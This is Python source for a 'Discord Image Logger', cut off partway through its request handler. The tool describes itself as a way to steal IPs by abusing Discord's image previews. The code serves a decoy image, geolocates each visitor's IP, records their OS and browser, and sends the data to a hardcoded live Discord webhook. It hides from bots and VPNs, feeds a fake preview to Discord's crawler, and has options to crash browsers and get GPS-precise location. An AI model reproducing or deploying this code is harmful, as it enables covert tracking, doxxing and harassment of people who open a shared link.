# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1157757083584827564/79v4aiBEecWObEycMMMCAm8VkbI-lpL5CszKM4pQBed1Nhb84XNvnywa7Ej65kCp2SKm",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
